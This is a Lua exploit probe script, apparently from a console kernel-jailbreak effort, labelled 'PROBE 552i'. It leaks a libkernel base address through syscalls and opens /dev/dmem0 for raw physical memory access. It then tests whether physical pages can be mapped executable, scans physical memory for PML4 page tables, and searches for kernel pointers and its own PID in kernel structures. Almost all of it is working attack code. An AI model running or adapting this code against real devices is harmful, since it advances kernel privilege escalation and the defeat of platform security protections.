-- CRASH_CLASS: MODERATE
-- PROBE 552i: Physical memory exec test + targeted structure scan
--
-- 552h confirmed: physical R/W via dmem0 is real, but kernel not
-- found in 0-512MB, 4-4.25GB. Beyond 0x150000000 blocked.
--
-- Tests:
--   [A] mmap dmem0 with PROT_EXEC — can we get executable phys memory?
--   [B] Scan for PML4-like page table structures in first 1GB
--   [C] Scan near our allocated phys pages for kernel data structures
--   [D] Write unique pattern, search for references (pointer scan)

print("=== PROBE 552i: Exec test + structure scan ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- libkernel
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel"); return end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))

local alloc_fn = lk + uint64(0x17EF0)
local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_open = mk(5)

local devpath = memory.alloc(32)
local path = "/dev/dmem0"
for i = 1, #path do wd(N(devpath) + i - 1, string.byte(path, i)) end
wd(N(devpath) + #path, 0)
local ok_o, fd_raw = pcall(function()
    return sc_open(uint64(N(devpath)), uint64(2), uint64(0))
end)
local dmem_fd = ok_o and N(fd_raw) or -1
if dmem_fd < 0 then print("FAIL: open"); return end

-- Allocate a physical page
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print("phys=" .. fmt(phys))

-- ============================================================
-- [A] mmap dmem0 with various PROT values including EXEC
-- ============================================================
print("")
print("[A] PROT_EXEC test on dmem0 physical memory")

local prot_tests = {
    {1, "PROT_READ"},
    {3, "PROT_READ|WRITE"},
    {5, "PROT_READ|EXEC"},
    {7, "PROT_READ|WRITE|EXEC"},
    {4, "PROT_EXEC only"},
    {0x33, "0x33 (GPU style)"},
}

for _, pt in ipairs(prot_tests) do
    if not alive() then break end
    local prot, label = pt[1], pt[2]
    local ok_m, rv_m = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(prot),
            uint64(1), uint64(dmem_fd), phys)
    end)
    if not alive() then print("  KILLED at prot=" .. label); break end
    local rv = ok_m and N(rv_m) or -1
    local rh = 0
    if ok_m then
        rh = get_hi_lo(rv_m)
        if rh < 0 then rh = rh + 0x100000000 end
    end
    local failed = (not ok_m) or rv == -1 or (rh == 0xFFFFFFFF)
    if failed then
        print(string.format("  prot=0x%X (%s): FAILED", prot, label))
    else
        print(string.format("  prot=0x%X (%s): MAPPED %s", prot, label, fmt(rv_m)))
        pcall(function() sc_munmap(rv_m, uint64(0x4000)) end)
    end
end

-- ============================================================
-- [B] Scan for page table structures (PML4 pattern)
-- ============================================================
print("")
print("[B] Page table scan (first 256MB)")

-- PML4 entries: present (bit 0) + writable (bit 1) + phys addr in bits 12-51
-- Kernel entries at PML4[256..511], user at [0..255]
-- A valid PML4 has several present entries in the upper half

local pt_candidates = 0
local scan_step = 0x1000   -- 4KB (PML4 tables are 4KB structures even on 16KB-page systems)
local pt_hits = {}

for off = 0, 0x10000000 - scan_step, scan_step do
    if #pt_hits >= 5 then break end
    if not alive() then break end

    local off_u = uint64(string.format("0x%X", off))
    local ok_m, rv_m = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(dmem_fd), off_u)
    end)
    if ok_m and N(rv_m) ~= -1 then
        local rh = get_hi_lo(rv_m)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh ~= 0xFFFFFFFF then
            local addr = N(rv_m)
            -- Check PML4 pattern: entries at offset 0x800 (index 256) onwards
            -- should have present bit set for kernel mappings
            local kernel_present = 0
            local user_present = 0
            for idx = 0, 511 do
                local entry = rq(addr + idx * 8)
                if entry then
                    local el = N(entry)
                    if el ~= 0 then
                        local present = el % 2
                        if present == 1 then
                            if idx >= 256 then
                                kernel_present = kernel_present + 1
                            else
                                user_present = user_present + 1
                            end
                        end
                    end
                end
            end
            -- A real PML4 typically has several kernel entries and a few user entries
            if kernel_present >= 3 and user_present >= 1 then
                table.insert(pt_hits, {off = off, k = kernel_present, u = user_present})
                print(string.format("    PML4 candidate at phys 0x%X: %d kernel, %d user entries",
                    off, kernel_present, user_present))
                -- Dump first few entries
                for idx = 0, 3 do
                    local e = rq(addr + idx * 8)
                    if e then print(string.format("      [%d] = %s", idx, fmt(e))) end
                end
                for idx = 256, 259 do
                    local e = rq(addr + idx * 8)
                    if e then print(string.format("      [%d] = %s", idx, fmt(e))) end
                end
            end
            pcall(function() sc_munmap(rv_m, uint64(0x4000)) end)
        end
    end

    if off % 0x1000000 == 0 then
        io.flush()
    end
end

print("  PML4 candidates: " .. #pt_hits)

-- ============================================================
-- [C] Scan near allocated phys for kernel structures
-- ============================================================
print("")
print("[C] Scan near allocated phys (+-8MB)")

local ph, pl = get_hi_lo(phys)
if ph < 0 then ph = ph + 0x100000000 end
if pl < 0 then pl = pl + 0x100000000 end

local center = pl + ph * 0x100000000
local scan_start = center - 0x800000
if scan_start < 0 then scan_start = 0 end
local scan_end = center + 0x800000
if scan_end > 0x150000000 then scan_end = 0x150000000 end

local interesting = {}
local step = 0x4000

for off = scan_start, scan_end - step, step do
    if not alive() then break end
    local off_u = uint64(string.format("0x%X", off))
    local ok_m, rv_m = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(dmem_fd), off_u)
    end)
    if ok_m and N(rv_m) ~= -1 then
        local rh = get_hi_lo(rv_m)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh ~= 0xFFFFFFFF then
            local addr = N(rv_m)

            -- Look for kernel pointers (0xFFFF8xxx_xxxxxxxx)
            for pg_off = 0, 0x3FF0, 8 do
                local v = rq(addr + pg_off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh < 0 then vh = vh + 0x100000000 end
                    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                        -- Not NaN-boxed (exponent != 0x7FF)
                        local exp = math.floor(vh / 0x100000) % 0x800
                        if exp ~= 0x7FF then
                            table.insert(interesting, {
                                phys = off + pg_off,
                                val = fmt(v),
                                vh = vh
                            })
                            if #interesting <= 20 then
                                print(string.format("    phys 0x%X+0x%X: kptr %s",
                                    off, pg_off, fmt(v)))
                            end
                        end
                    end
                end
            end

            -- Look for our pid value
            for pg_off = 0, 0x3FFC, 4 do
                local d = rd(addr + pg_off)
                if d == pid then
                    print(string.format("    PID MATCH at phys 0x%X+0x%X!", off, pg_off))
                    -- Dump context around it
                    for ctx = -32, 32, 8 do
                        if pg_off + ctx >= 0 and pg_off + ctx < 0x4000 then
                            local cv = rq(addr + pg_off + ctx)
                            print(string.format("      %+d: %s", ctx,
                                cv and fmt(cv) or "nil"))
                        end
                    end
                end
            end

            pcall(function() sc_munmap(rv_m, uint64(0x4000)) end)
        end
    end
end

print("  kernel pointers found: " .. #interesting)

print("")
print("alive=" .. tostring(alive()))
print("DONE")
